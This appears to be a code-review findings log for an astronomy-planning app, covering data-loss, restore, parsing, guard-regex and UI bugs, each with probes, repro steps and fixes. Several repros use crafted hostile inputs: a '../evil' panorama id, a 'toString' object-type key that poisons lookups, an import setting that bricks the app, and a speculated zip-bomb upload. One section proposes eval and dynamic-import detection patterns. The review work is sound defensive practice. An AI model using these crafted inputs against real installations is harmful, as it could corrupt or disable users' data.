findings.title: `/api/library/edit` silently overwrites a same-named frame in an existing folder; two rows alias one file and the replaced pixels are gone
findings.impact: renaming an unresolved group to a name whose folder already exists
findings.mechanism: renaming an unresolved group to a name whose folder already exists (e.g. "Unknown target" -> "NGC 7000") replaces the colliding frame in place and answers `200 {"ok":true}`; the library then lists two frames that resolve to ONE file, and nothing else holds those bytes (`make_backup` copies only the DB). The `new.exists()` branch uses `f.replace(dest)` with no uniquify, although `_archive_target` (`app/ingest.py:88-90`) does exactly that for ingest.
findings.evidence: `probe_rename_collision.py` -> before, `Unknown target\undated\lights\Light_001.fit = c7f2cc18cd3b (30B)` and `NGC 7000\undated\lights\Light_001.fit = a4a2c010652f (36B)`; `POST /api/library/edit -> 200 {"ok":true,...}`; after, `files on disk: 1 (started with 2)` and `stored rows: [('NGC 7000','.../undated/lights/Light_001.fit'), ('NGC 7000', same path)]`.
findings.repro: two folders with one slug, both holding `undated/lights/Light_001.fit` (no DATE-OBS or the same night), one group with `object_id IS NULL`; `POST /api/library/edit {"name":"Unknown target","new_name":"NGC 7000"}`.
findings.counterArgument: merging into an existing folder is the documented intent of `rename_archive_folder`, and the user typed the target name. But no docstring, route, UI (`static/js/archive.js:286-302` posts with no confirmation) or test says a same-named frame may be replaced - `tests/test_api.py:287-304` only renames to a fresh name - so this is unsignposted data loss, not a merge policy. Pre-existing, not a 0.6.32 regression.
findings.requiredFix: never land on an existing `dest` (reuse the `_archive_target` `stem_2` shape and feed the real paths to `db.rename_images`), or refuse with 400 when any `dest` exists.
findings.captainVerification: UPHELD as blocker. Independently reproduced with a different construction (evidence/verify/verify_py01_captain.py, public API only): route 200 {"ok":true}; files 2 -> 1; destination EXPTIME 60.0 -> 120.0; two rows aliasing NGC 7000/2026-08-22_2314/lights/Light_001.fit. Counter-argument defeated: app/ingest.py:88-89 uniquifies to _2 for ingest, so the rename-merge overwrite contradicts the module's own rule, and no safety copy covers library edits.

findings.title: a bundle's `min_vis` is never validated, so one crafted setting bricks `/api/state` and the desktop cannot start
findings.impact: importing a ZIP with `"min_vis": "abc"` (or `null`) succeeds, then every
findings.mechanism: importing a ZIP with `"min_vis": "abc"` (or `null`) succeeds, then every `GET /api/state` is 500; `static/js/main.js:54` awaits that route in `loadState()` before anything else, so the desktop shows its boot error banner and stays unusable until the row is repaired or the DB deleted. Same class as the PY-04 fix ("a hostile setting could brick /api/state at every boot") - one key missed.
findings.evidence: `probe_settings_import.py` -> `settings['min_vis'] = 'abc': import=accepted | GET /api/state -> 500 Internal Server Error` (same for `None`); `bortle`/`edge_space`/ `size_unit` are refused with a ValueError.
findings.repro: zip `{"app":"NightSeam","settings":{"min_vis":"abc"},...}` -> `POST /api/import` (200) > `GET /api/state` (500).
findings.requiredFix: validate `min_vis` like `bortle` (finite, int-coerced, clamped 0..100) and let `/api/state` fall back defensively.
findings.counterArgument: normal users cannot produce it - `/api/settings` is `Optional[int]` (`tests/test_api.py:87-103`), so only a crafted/hand-edited bundle triggers it. Hence medium.

findings.title: the Python restore replaces the database before writing payloads; a later failure answers 400/500 with no rollback and never says the library was replaced
findings.file: `app/backup.py:190-191` (commit) then `:193-222` (writes, no rollback), `:239-240` (closes the zip only); status mapping `app/server.py:700-706`
findings.impact: the library is replaced, some payloads are written, one row is left pointing
findings.mechanism: the library is replaced, some payloads are written, one row is left pointing at a file that will never exist, and the user reads `500 Failed to write restored files` or, worse, `400 {"detail":"zip member too large: panos/too-big.jpg"}` - which reads as "bundle rejected". `import_bundle` commits transaction 1; the payload loop is an unrelated second phase, and the route maps `ValueError -> 400`.
findings.evidence: `probe_backup_partial.py` -> A) `sites after: ['Imported']`, `panorama rows: ['fail.jpg','ok.jpg']`, `payload files: ['ok.jpg']`, `safety copy: True`; D) `POST /api/import -> 400 {"detail":"zip member too large: panos/too-big.jpg"}` with `panorama rows: ['too-big.jpg','small.jpg']`, `payload files: ['small.jpg']`.
findings.notes: Settling the prior probe::this is the documented design of the Python path, not a violated claim. `AGENTS.md:318-321` scopes staging+rollback to the WEB path ("`restoreBackup` stages/validates the whole bundle BEFORE any write and rolls back to the `meta`/`safety` snapshot if a write fails"); for Python `AGENTS.md:722-723` promises only that "every import first writes a best-effort safety copy to `<db>.backup-auto.zip`". I verified that promise: the failed import's safety copy holds the PRE-import state (sites `['Original']`, no panoramas), so this is a **recoverable inconsistency, not data loss** - caveat: a single slot, so the next import attempt overwrites the recovery point.
findings.counterArgument: the safety-copy contract is explicitly best-effort and the only incomplete data is the failed bundle's own payload, which the user still holds - the defect is the misleading status plus the partially-applied state. Related SUSPECTED (not filed): `MAX_MEMBER_BYTES` bounds each member but nothing bounds the member count or total, so a <=2 GB upload can expand to ~TB of writes into `data/panos`; I did not build the bomb.
findings.requiredFix: wrap the payload phases and either roll forward (naming the incomplete records) or refresh the safety copy; never answer a bare 400 after the database has been replaced.

findings.title: a malformed-but-valid bundle produces HTTP 500 while the API documents ValueError/400
findings.file: `app/backup.py:129-141` ("Raises ValueError on malformed input"), transaction `app/database.py:928-1024`, route `app/server.py:700-706`
findings.impact: an opaque 500 plus a log traceback instead of an actionable 400, for
findings.mechanism: an opaque 500 plus a log traceback instead of an actionable 400, for bundles that get past the initial read and then hit `sqlite3.IntegrityError` (NULL name, non-integer site id, duplicate ids) or `AttributeError` - neither `ValueError` nor `OSError`. Nothing is corrupted (the transaction rolls back).
findings.evidence: `probe_malformed_bundle.py` -> `site name null -> IntegrityError ... HTTP=500`, `duplicate pano ids -> UNIQUE constraint failed ... HTTP=500`, `site entry not a dict -> AttributeError ... HTTP=500`, `sites not a list -> ValueError ... HTTP=400`; `sites after=['Original']` every time.
findings.repro: `POST /api/import` with `sites: [{"id":1,"name":null,...}]`.
findings.requiredFix: wrap `import_bundle` and re-raise `(ValueError, TypeError, AttributeError, sqlite3.Error)` as `ValueError("malformed setup bundle: ...")`.
findings.counterArgument: the data is protected and the import did fail, so only the error contract is wrong.

findings.title: integer path parameters beyond 64 bits answer 500 (OverflowError) instead of 404
findings.impact: pydantic accepts arbitrary-precision ints and they go straight into sqlite3,
findings.mechanism: pydantic accepts arbitrary-precision ints and they go straight into sqlite3, which raises `OverflowError: Python int too large to convert to SQLite INTEGER` -> a 500 with a traceback instead of a clean 404.
findings.evidence: `probe_bigint_params.py` -> `GET /api/images/999999999999999999999/preview -> 500`, `PUT`/`DELETE /api/sites/<big> -> 500`, `9223372036854775807 -> 404`, and the direct call prints the OverflowError.
findings.counterArgument: only a hand-crafted URL reaches it; robustness-only.
findings.requiredFix: bound the int-id path params (`ge=0, le=2**63-1`).

findings.title: the restore writes payload files for records it refuses to store, and counts them without a record
findings.impact: the write loop filters only on `safe_rel(file)`; the id-token drop happens
findings.mechanism: the write loop filters only on `safe_rel(file)`; the id-token drop happens later inside `import_bundle`, but the record is still in `panos`, so a panorama with a non-token id leaves an orphan file in `data/panos` (invisible, never cleaned) while the summary reports the pair `panoramas: 0, pano_images: 1`.
findings.evidence: `probe_http_contract.py` -> `non-token pano id -> summary {'panoramas': 0, ..., 'pano_images': 1, ...}`.
findings.repro: bundle `panoramas:[{"id":"../evil","file":"ok.jpg",...}]` + member `panos/ok.jpg`.
findings.counterArgument: the written path is validated, so this is untidiness, not traversal.
findings.requiredFix: compute the accepted records once (`safe_rel(file) and safe_token(id)`) and drive both the insert and the write loop from that set.

findings.title: duplicate custom-target ids are silently collapsed while the summary reports both
findings.file: `app/database.py:976-993` (`INSERT OR REPLACE INTO custom_objects`); `_reject_duplicate_paths` covers only images/panoramas (`:925-926`); summary `app/backup.py:228`

findings.mechanism: two bundle targets sharing an id become one row while the summary says `customs: 2` - the same silent-loss shape PY-01 was fixed for, in its record-id form.

findings.title: an upload that dies mid-stream leaves a truncated .fit that `/api/library/reindex` later records as a real frame
findings.file: `app/ingest.py:156-166` (only `OSError`/size-cap unlink the target), `:192-202` (`_stream_to` has no cleanup), reindex `:239-326`
findings.impact: the parsed header is written first and the body streamed, so a `read()` that
findings.mechanism: the parsed header is written first and the body streamed, so a `read()` that raises anything but `OSError` (Starlette raises `ClientDisconnect`) escapes `ingest_one` and the `except OSError: target.unlink(...)` never runs; closing the app mid-ingest leaves a half-written frame on disk that the next reindex lists as a normal capture with missing pixels.
findings.evidence: `probe_ingest_disconnect.py` -> `outcome: ClientDisconnect`, `files on disk: [('Andromeda Galaxy/undated/lights/m31.fit', 3880)]`, `db rows: 0`, then `reindex_library: {'found':1,'added':1,...}` and one stored row.
findings.repro: abort a large ingest mid-stream (close the tab/window), then run reindex.
findings.counterArgument: a local app rarely loses the connection and the request does error out with no DB row; but reindex cannot detect a truncated file, so the cleanup belongs at write time.
findings.requiredFix: `except BaseException: target.unlink(missing_ok=True); raise` around `_stream_to` in `ingest_one` (keep the friendly `OSError` message).

findings.title: `IMAGETYP = "Master Dark"`/`"Master Flat"` is classified as a light frame
findings.impact: letters are reduced then matched with `startswith`, so `"masterdark"` matches
findings.mechanism: letters are reduced then matched with `startswith`, so `"masterdark"` matches neither `dark` nor `flat` and falls through to `return "light"`; master calibration frames land in `<object>/<session>/lights/` and are counted as lights. The docstring claims the multi-word spellings are handled and `fits._STOPWORDS` already knows "master".
findings.evidence: `probe_fits_edges.py` -> `classify_frame('Master Dark') -> 'light'` vs `'Dark Frame' -> 'dark'`, `'SkyFlat' -> 'flat'`; `grep classify_frame tests/` shows this value is untested.
findings.repro: `python -c "from app.ingest import classify_frame; print(classify_frame('Master Dark'))"`.
findings.counterArgument: `AGENTS.md` defines only "unknown -> lights", and capture software normally writes "Dark"/"Dark Frame"; "Master Dark" is more often a file name. Narrow, hence low.
findings.requiredFix: strip a leading `master`/`m` qualifier before the `startswith` chain.

findings.title: any FITS card whose keyword begins with `END` truncates the header, dropping every later keyword
findings.impact: the terminator test is a bare prefix test, not "the END card", so a file
findings.mechanism: the terminator test is a bare prefix test, not "the END card", so a file carrying e.g. `ENDTIME` silently loses `EXPTIME`/`OBJECT`/`DATE-OBS`/coordinates and the frame becomes unresolved and `undated`.
findings.evidence: `probe_fits_edges.py` -> `END-prefixed keyword truncates the header: parsed keys: ['OBJECT','SIMPLE']`, `EXPTIME=None` although the card sits in the same block.
findings.repro: `read_fits_header` on a block with `ENDTIME = 12345` before `EXPTIME`. require the FITS terminator shape (`rec[:3] == "END" and not rec[3:].strip()`).
findings.counterArgument: `ENDTIME` is not valid FITS (the standard reserves `END` standalone), so this is robustness against non-conforming writers. The other header checks I probed (80-byte boundary, blank/value-only/non-ASCII cards, truncated header, `nan`/`1e400` cards, missing `DATE-OBS`, sexagesimal coordinates) all behaved correctly.

findings.title: `check_core.py` never reads a `.html` or a non-`.js` file, so an inline `<script>` re-implementation passes the moved-concept guard
findings.impact: the guard meant to make `core/` the ONLY astronomy implementation cannot see a file type both shells ship - math pasted into `web/index.html`'s or `static/index.html`'s inline `<script>` still reports `check_core: OK`.
findings.mechanism: `*.js` only, while `web/index.html:8` and `static/index.html:8` carry a live inline `<script>`.
findings.evidence: `guard_predicate_probe.py` -> `NOT SCANNED index.html`, `NOT SCANNED helper.mjs`, `NOT SCANNED lib.txt`, but `SCANNED app.js`; `guard_holes_probe.py` (scratch copy, real tree untouched) -> same mutation `CAUGHT` in `web/app.js`, `*** NOT CAUGHT ***` in `web/index.html`.
findings.repro: append `<script type="module">function julianDay(d){return 2451545.0}</script>` to `web/index.html`; `python scripts/check_core.py` -> still `OK`.
findings.requiredFix: scan `.js` + `.mjs` + `.html`, and for `.html` only the `<script>` bodies (the MOVED patterns are substring regexes, so a whole-file scan would fire on prose).
findings.counterArgument: the guard never claimed to read HTML and a committer editing `core/` has no reason to paste math into a page - lower likelihood, same hole; the check's contract is "a moved concept cannot be re-implemented outside `core/`".

findings.title: the MOVED-concept regex misses object-shorthand methods and getters
findings.impact: `const H = { julianDay(dt) { ... } };` or `{ get gmstDeg() {...} }` in a shell is a working re-implementation the guard reports clean.
findings.mechanism: the method form `(?:^|[;}\n])\s*name\s*\([^)]*\)\s*\{` allows `;`, `}` and newline before the name but not `,` or `{` - exactly what precedes an object-literal method; a getter has `get ` before the name.
findings.evidence: `guard_predicate_probe.py` -> `NOT CAUGHT method (property after comma)`, `NOT CAUGHT method (property after brace)`, `NOT CAUGHT getter accessor`, while the four shapes pinned by `tests/test_core_drift.py:158-164` are `CAUGHT`.
findings.repro: append `const H = { profileSegments(a) { return []; } };` to `web/horizon.js`; `python scripts/check_core.py` -> `OK`.
findings.requiredFix: add `,` and `{` to the method-form leading class and accept an optional `get `/`set `/`async `/`*` prefix.
findings.counterArgument: TS3 (0.6.24) already hardened this once and the current forms cover how a human normally writes a helper; medium because it is a guard, not a user path.

findings.title: the core purity guard cannot see dynamic code loading
findings.impact: `core/` is contractually "no DOM, storage, network", but `await import('data:text/javascript,...')`, `new Function(...)`, `eval(...)` and `importScripts(...)` inside `core/` pass all six purity patterns.
findings.mechanism: the patterns name *capabilities* (`document.`, `window.`, `fetch(`, ...) but never a *loader*; a `data:`-URL import is a code-injection path with no identifier the guard knows.
findings.evidence: `guard_predicate_probe.py` section 3 -> `NOT CAUGHT "eval('1+1')"`, `NOT CAUGHT "new Function(...)"`, `NOT CAUGHT "importScripts('x.js')"`, `NOT CAUGHT "await import('data:text/javascript,...')"`.
findings.repro: add `const x = eval('1+1');` to `core/format.js` - the hash/re-bake guard fires, the purity list does not.
findings.counterArgument: a future core module might legitimately need a dynamic import and `eval` in a pure math module is implausible - robustness, hence low.
findings.requiredFix: add `\beval\s*\(`, `\bnew\s+Function\b`, `\bimportScripts\s*\(`, `\bimport\s*\(` to `FORBIDDEN`.

findings.title: `altaz()` can return `az === 360`, outside its documented `[0,360)` range
findings.impact: 360 instead of 0 breaks the range contract for a function every chart and profile lookup consumes. No consumer I found uses az as a key without re-normalizing (`planning_client.js:162`, `skyview.js:279`), so no user-visible defect could be shown.
findings.mechanism: for `east = -0` and `north < 0`, `atan2` returns `-PI`; IEEE-754 rounds `-PI*R2D` to exactly `-180`, `-180 % 360` to exactly `-360`, so `+= 360` gives `+360`. The double modulo in `gmstDeg`/`altazFrame` avoids this.
findings.evidence: `astro_edge.mjs` reported 8 of ~2000 combinations with `az: 360` (`{lat:-66.5, dec:90, ra:180, jd:2451545}`; `{lat:0, dec:90, ra:180}` - the pole, where `east = -0`). NOT reproducible deterministically afterwards: `az360_probe.mjs` scanned 3,110,400 combinations and found 0.
findings.repro: `node reviews/0.6.32-full/evidence/core/astro_edge.mjs` -> `azRange_bad`.
findings.counterArgument: every caller normalizes and 360 == 0 astronomically, so this is a contract/robustness defect, never a wrong number - hence low + SUSPECTED.
findings.requiredFix: `((Math.atan2(east, north) * R2D) % 360 + 360) % 360`, also at `core/astro.js:160`.

findings.title: `moonAge()`'s docstring says "age in days" but the function is a folded 0..14.76 value
findings.impact: the unsigned elongation loses waxing/waning, so a 23-day waning moon reports ~7.7. Every current consumer is built for the folded value, but `core/astro.js` - the file a future consumer reads - never says "folded". mechanism: `return SYNODIC_MONTH * psi / (2 * Math.PI);` with `psi` the unsigned elongation (`acos`), range `[0, SYNODIC/2]`.
findings.evidence: new 2026-08-12 17:37 `age 0.113`; first quarter `7.28`; full 2026-08-28 04:18 `14.69`; **last quarter 2026-09-04 `7.73`** (true age ~22.8 d). `reference_anchors.mjs:322/325` sample only new and full, where they coincide.
findings.repro: `node -e "import('./core/index.js').then(C=>console.log(C.moonAge(C.julianDay(new Date('2026-09-04T00:00:00Z')))))"` -> `7.7284`.
findings.counterArgument: the pipeline is internally consistent - `core/scoring.js:27` and `derive.js:165` both say "folded" and both engines fold identically - so this is a misleading core docstring, not a wrong value.
findings.requiredFix: say so in the docstring ("folded to one half-cycle; waxing/waning not represented") - no behaviour change.

findings.title: the "rotation order" is pinned by no test, and the Meeus anchor is not an independent transcription
findings.file: `tests/js/reference_anchors.mjs:69-82` (`meeusPrecess`), `:97-108` (`iau2006Precess`), `:139-149` (`precession_round_trip`); claim in `AGENTS.md` ("eq.21.4 with the middle rotation about **Y**")
findings.impact: the suite cannot distinguish the documented Z-Y-Z composition from any composition landing within 2 arcsec, so a future edit that blends the rotations (the old X-axis bug's shape) stays green. Two of the 19 checks are self-consistency identities by construction.
findings.mechanism: `atan2(A,B) + z` is the standard reduction *equation* and equals the honest matrix product; the anchor re-derives that equation instead of composing the three rotations, so code and anchor share one reading. `precessDateToJ2000` negates the same angles with the same structure, so the round trip closes by construction (< 0.005 arcsec measured) whatever the order is.
findings.evidence: `precess_order.mjs` -> `coreMinusAnchor_as = 0` and `coreMinusMatrix_as = 0` at every point; `precess_adjudicate.mjs` -> the correct chain scores `matrix_vs_analytic_arcsec: 0`, the swapped order 20-1600 arcsec.
findings.repro: `node reviews/0.6.32-full/evidence/core/precess_adjudicate.mjs`.
findings.counterArgument: the Meeus/IAU comparisons *do* pin the result to 2 arcsec over 1900-2100 at 6 points incl. the pole and the seam, and sign errors in zeta/theta/z are caught (my sweep moves 404-1112 arcsec).
findings.requiredFix: no behaviour change - scope the `AGENTS.md` claim, or add one check that composes the three matrices and compares at ~1e-5 deg.

findings.title: the two shells compute "% of night" on differently PHASED 6-min grids with different denominators
findings.file: `core/scoring.js:180-181` (`pct: Math.round(100 * visN / (n + 1))`), web anchor `web/app.js:165` (`jd0: E.julianDay(w.dusk)`), desktop grid `static/js/planning_client.js:22` (`GRID_N = 241`, noon->noon) + `static/js/derive.js:160,201` (`nightN = i1 - i0 + 1`); `core/catalog.js:36-40` + `web/build_web.py:31-34` (low CONFIRMED): `searchBlob` never indexes the row's `search` column and the payload does not ship it, so 25 rows are findable on the desktop but not the web by common name (`"tarantula" ["ngc2070"] vs []`, `"coathanger" ["cl399"]`, `"silver coin" ["ngc253"]`). Fix: add `search` to `build_web.py::COLS` (+ `CATALOG_TOKEN` bump) and to `searchBlob`. Counter: likely the mirror of the already-filed desktop-side `CD-02` - merge, do not double-file.; `core/catalog.js:10-25`, `core/scoring.js:15-19,29`, `static/js/skymap.js:204` (low CONFIRMED): plain object literals, so a crafted `otype` of `"toString"` returns an inherited `Object.prototype` member and defeats every `X[t] || fallback` - the type cell renders native function source and the moon-aware score becomes `NaN`. Only a crafted setup ZIP reaches it (`app/database.py:986` stores `otype` verbatim). Fix: `Object.assign(Object.create(null), {...})` / `Object.hasOwn` + a `|| "unknown"` at `skymap.js:204`. Counter: every in-app producer clamps `otype`; worst case is garbled text plus a never-rendered NaN ranking key - calibrate upward if setup bundles are treated as untrusted (they are). Refuted by them: the scoring curves cannot drift (both shells only re-export core), so `scoring_parity.mjs` compares core with itself and covers only batched-vs-split identity plus frozen display fields on a `pano=null` grid; they separately verified the inlined ceiling against `ceilFor` (3672 combos, 0 mismatches). Tier edges exact, order-independent, F for zero/NaN popularity, mode-independent on the real payload (0/200). `wikiTitles` non-empty and duplicate-free on all 12,176 rows (its Messier digit-scavenge would turn a synthetic `"M31/110"` into "Messier 31110", but every shipped value matches `^M\d+$`). `moonMinDist(_, undefined)` and an inverted window (`n=2, pct=100`) are unreachable through shipped callers. Cross-lane note for the web lane: `web/app.js:869-870` keeps no-magnitude rows for the standard catalogue but drops them for `_adv` rows, so such an object never reaches the sky chart even at the slider maximum, while `AGENTS.md` says the rule "filters EVERY object".
findings.impact: the same object on the same night shows a different `% of night` on the web than on the desktop for 20-66 of the 200 standard rows (up to 4 pp). Since 0.6.30 the web's Min-visibility gate (`web/app.js:1361`, default 1%) keys on the WEB number, so the shells can also disagree about list membership.
findings.mechanism: core derives its count from the span (`n = round((jd1-jd0)/step)`) then divides by `n + 1`; the desktop counts the samples its noon-anchored grid places inside `[dusk,dawn]` and divides by that. `sunCrossings` interpolates dusk/dawn between 10-min scan samples, so dusk is off the 6-min grid (Berlin 2026-09-22: `dusk-noon mod 6 min = 1.612`) - different instants AND an off-by-one denominator (79 vs 80).
findings.evidence: `probe_desktop_real.mjs` (drives the real `state.js` + `derive.js::recomputeNightDerived` and the real core path) -> `Berlin 2026-09-22: nightN=79 webGrid=80 differing=43/200 maxDiff=2pp`; `2026-06-21: 27 vs 28, differing=20/200, maxDiff=4pp`; `Tenerife: 107 vs 108, 66/200`. Replicated by `probe_window_parity.mjs` (same 43/20/66). I read both anchor lines myself and re-ran `derive_window.mjs` (passes - it compares grid-aligned `times[10]`/`times[29]`, so it is blind to the phase).
findings.repro: `node reviews/0.6.32-full/evidence/core/probe_desktop_real.mjs`.
findings.requiredFix: snap the web's scoring window to whole noon-grid steps (first sample >= dusk .. last <= dawn) so both shells count the same instants, or pass core an explicit sample range.
findings.counterArgument: both numbers estimate the same window, a one-sample phase shift is arguably sampling noise, and no test claims numeric equality (the 241-sample noon grid is pinned by the `scrubgrid` engine, so "fixing" the web redefines its window). Medium, not high: neither number is wrong, only inconsistent - but `AGENTS.md` does claim "the web scores the same window as the desktop on a 6-min grid", and the gate is now user-visible.
findings.notes: Scoring/catalogue delegate digest:(their probes; I confirmed CO-07 by reading the code and re-running their engine, but did not re-derive these two):

findings.title: an offline/timed-out Wikipedia lookup is cached as a DEFINITIVE "no photo" for 30 days (regression in 0.6.32)
findings.file: `web/app.js:483` (`let transient = false;`), `:509-513` (`const definitive = !transient; if (definitive) await idbSet(key, { missing: true, ... })`)
findings.impact: 194 of 12,176 objects ship a bundled photo, so nearly every detail view takes this path. One offline open, a DNS failure, or the 12 s abort on a slow link writes `{missing:true}` into the browser image cache and tells the user "no photo on Wikipedia"; the app then repeats that for 30 days without retrying.
findings.mechanism: `transient` is only raised for a non-ok HTTP status or a non-image body, so a *rejected* `fetch`/abort falls straight into `catch` and is treated as definitive. Pre-0.6.32 the flag was inverted (`let definitive = false;`, set only for 404/no-thumb/no-img/bad-type), so a network failure was NOT cached - c430983 flipped the polarity.
findings.evidence: `node web_probe.mjs` -> `fetch=reject: cached={"missing":true,...} | message="no photo on Wikipedia — see the link below"` (assertion written inverted, so this FAIL line proves it); controls: 429 caches nothing and says "photo unavailable right now", 404 caches as definitive, disambiguation-then-image resolves.
findings.repro: open any object without a bundled photo while offline (or block `en.wikipedia.org`), then reload online - the detail view keeps claiming there is no photo.
findings.requiredFix: set `transient = true` whenever the request itself failed (wrap each `await fetch(...)`, or in `catch` when the error is not the deliberate `no-thumb`/`bad-type`/`no-img` throw) and skip the `missing` write for those.
findings.counterArgument: the TTL is 30 days and the "Wikipedia ↗" link still works, so the damage is a missing convenience, not a wrong plan. But the comment above the line and the 0.6.32 invariant in `AGENTS.md` both claim only definitive failures are remembered, and 0.6.31 did it correctly.

findings.title: `restoreBackup` writes the user records before the panorama section is validated; the documented "atomic" claim does not hold
findings.impact: a bundle with an unusable panorama section is rejected only *after* sites/rigs/targets were cleared and rewritten. `app.js` normally compensates with `applyWebSnapshot(current, current)`, but that pass runs the same panorama write: if it fails (localStorage at quota -> `applyPanosSnapshot` returns false, `horizon.js:300-303`) the inner `catch {}` swallows it, the rejected bundle's records stay and the user is only told "Import failed".
findings.mechanism: `stageBackup` treats `panos` as opaque; `Hor.normalizePanos` runs in `applyWebSnapshot` after `WS.restoreBackup` has already written.
findings.evidence: `web_probe.mjs` P2 -> `staged.panos=null | normalizePanos(...)=null | sites now=["evil"]` (the pre-existing site was replaced before the caller could reject it); a failing `put` does roll back correctly (`sites=keep`).
findings.repro: import a backup with valid `sites` and `"panos": "oops"`; inspect IndexedDB after the "Import failed" alert.
findings.requiredFix: include the panorama section in the staged validation (`stageBackup` requiring `Array.isArray(data.panos.panos)`, or calling `Hor.normalizePanos` before `WS.restoreBackup`).
findings.counterArgument: the only caller does compensate, and the residual failure needs localStorage to be at quota at that moment - a reviewer could call this hardening. It is filed because the invariant is what makes callers trust the function and the failure mode is silent record replacement.

findings.title: `writeStaged` ignores a failed `clearStore`, so a restore can report success and merge old + new records
findings.impact: a clear that fails while the puts succeed leaves the previous records beside the imported ones (ghost sites/rigs/targets) and no error is reported anywhere.
findings.evidence: `web_probe.mjs` P2 -> `failed clear -> restore "succeeded"=true, sites=["evil","keep"]`.
findings.repro: inject one failing `clear()` (`CTL.failClear.sites = 1`) then call `restoreBackup`.
findings.requiredFix: check the clear results and throw, so the caller's rollback engages.
findings.counterArgument: a bare `clear()` failure with successful `put`s is rare (an aborted transaction fails both), so this is robustness rather than a case users hit today.

findings.title: custom targets dropped by a backup import stay in the catalog until a page reload
findings.file: `web/app.js:2423-2430` (`reinitUserData` only upserts), `:1915-1920` (`upsertTarget` never removes), call site `:2247`
findings.impact: after "Import backup" the Setup -> Targets pane and the live Targets list disagree: targets the backup did not contain are still listed, searchable, clickable (their detail view opens) and drawn in the sky chart until a reload - exactly when the user expects the browser data to have been replaced.
findings.evidence: `web_probe.mjs` P3 (real `reinitUserData`) -> `catalog after the import: ["u_old","u_new"] | store: ["u_new"]`.
findings.repro: add target A, export, add B, import the first backup -> A is still listed.
findings.requiredFix: in `reinitUserData`, drop the previously added custom entries (`CAT = CAT.filter((o) => !o.custom)` plus their `byId` keys) before re-upserting the store's targets.
findings.counterArgument: nothing stale is written back (`collectBackup` reads the store) and a reload clears it, so it is a contradictory list, not lost data.

findings.title: any preference/site/date change while the panorama editor is open silently discards the unsaved paint
findings.file: `web/horizon.js:802` (`const hist = newHistory(p)`), `web/app.js:1901-1912` (`refreshView`), `:551-555` (`renderHorizonView`); triggers `:2557-2560` site, `:2579-2586` min-alt, `:2593-2604` date, `:2744` moon-aware, `:2760-2763` filters/size unit, `:2764-2767` rig, `:2752-2759` Bortle, `:2741` timezone, `:2125` quick-site
findings.impact: edits live in memory until Save; the re-render rebuilds the editor session with `newHistory(p)`, whose baseline is the CURRENT (unsaved) state, so the chip flips from "● Unsaved changes" to "Saved", `horizonUnsaved()` becomes false, and both `route()`'s `flushHorizonEdits()` and the `beforeunload` guard skip - the paint is gone on the next reload. `AGENTS.md` promises the opposite ("never lose an edit").
findings.evidence: `node web_probe_editor.mjs` (real `renderHorizon`+`wireEditor`) -> `after the re-render: horizonUnsaved()=false, stored strokes=0`; after `flushHorizonEdits()` `stored strokes=0`; `web_probe.mjs` P5 shows the same at the history-API level and that the undo stack is reset to one entry.
findings.repro: Horizon tab -> paint -> drag the topbar min-alt slider and release (or change site/date/Bortle) -> chip says "Saved" -> reload -> paint gone.
findings.requiredFix: keep the baseline from the persisted record instead of `newHistory` on a dirty in-memory pano, or call `flushHorizonEdits()` at the top of `renderHorizonView()`.
findings.counterArgument: a user who only paints and presses Save is unaffected, and the edit is not half-applied to planning (the same object backs `activePano()`); the loss needs another control to be touched before reloading.

findings.title: when IndexedDB is unavailable the app dies on the splash with no view and no retry
findings.file: `web/webstore.js:84-96` (`all()` has no `try/catch`, unlike `get`/`set`/`del`), `web/app.js:2524` (`SITES = await WS.getSites();`, unguarded), `:533-536` (`hideSplash`), `:2862-2863` (`route()` is reached only at the end of `boot`)
findings.impact: in a browser that denies site storage the catalogue loads, then `boot()` rejects: no view is ever rendered, `#splash` spins forever, the tabs are inert (no `hashchange` listener was registered) and the only feedback is a 15 s `unhandledrejection` banner naming a `SecurityError`. A failing/offline catalogue fetch hits the same dead end, with the splash text "catalog failed to load: …".
findings.evidence: `node web_probe_idb_denied.mjs throw-open` and `error-open` -> `boot() -> SecurityError … | #splash.style.display="" | #splash-text="catalog ready · 0 objects"`; `web_probe_boot.mjs catalog-fail` -> `#splash-text="catalog failed to load: Failed to fetch"`.
findings.repro: load `web/` where `indexedDB.open` throws (probe `CTL.open='throw-open'`), or offline on the first load.
findings.requiredFix: wrap the user-data part of `boot()` (or make `all()` degrade with a flag) and always end boot with either a rendered view or an explicit error card naming the cause plus a retry.
findings.counterArgument: Chrome/Firefox private windows do allow IndexedDB, so this needs an unusual configuration, and the offline variant is inherent to a static site without a service worker - hence medium rather than high.

findings.title: the topbar scrub keeps the previous night's time after a date (or site) change
findings.file: `web/app.js:2607-2631` (`syncScrub` runs only at boot and on `sky:time`), `:1901-1905` (`refreshView` -> `clampSkyTime`), `:218-224` (moves `S.skyTime`, dispatches nothing)
findings.impact: after changing "night of" or the site, `S.skyTime` is re-clamped but the always-visible `#tb-scrub-time` label and the slider position keep the old instant, contradicting the Tonight card and Sky View, which do update.
findings.evidence: `node web_probe_boot.mjs` -> boot `S.skyTime=…17:51Z (19:51)`, `#tb-scrub-time="19:51"`; after `#tb-date` -> next night `S.skyTime=…17:17Z (19:17)` but `#tb-scrub-time="19:51"` and `scrub.value` unchanged (32/684).
findings.repro: set the topbar date to tomorrow and read the scrub label.
findings.requiredFix: dispatch `sky:time` (or call `syncScrub`) after `clampSkyTime()` in `refreshView()`.
findings.counterArgument: display-only - every computed result uses `S.skyTime` - and it self-corrects on the first scrub or tab change.

findings.title: a hung wizard validate creates a DUPLICATE observing site on retry
findings.impact: the first-run wizard's own error message tells the user to retry. Retrying after a slow (but eventually successful) `POST /api/sites` leaves the user with **two identical sites** in the topbar `#siteSelect` and in Setup -> Sites, both with the same name/coordinates, with no indication which is "the" site.
findings.mechanism: the 20 s `Promise.race` guard drops `_busy` and shows "The previous step is still busy - please try again." but **nothing cancels the pending `validate()`**. Its `api()` call has a 30 s timeout, so it can land after the guard. A retry runs the location step again against the same `S.cfg` snapshot (still no active site, because the first request has not resolved), so `wizard.js:62` finds no `active` and takes the `POST /api/sites` branch a second time. `POST /api/sites` has no dedup (`app/server.py:477-483`).
findings.evidence: `node reviews/0.6.32-full/evidence/desktop/wizard_hang.mjs` (first `POST` lands 25 s after the click, guard fires at 20 s): ``` after 1st Next : posts ["POST /api/sites"] | err "" after guard    : err "The previous step is still busy - please try again." | posts ["POST /api/sites"] after 2nd Next : posts ["POST /api/sites","POST /api/sites"] S.cfg.sites    : [{"id":101,...},{"id":102,...}]     <- two identical "Backyard" sites ```
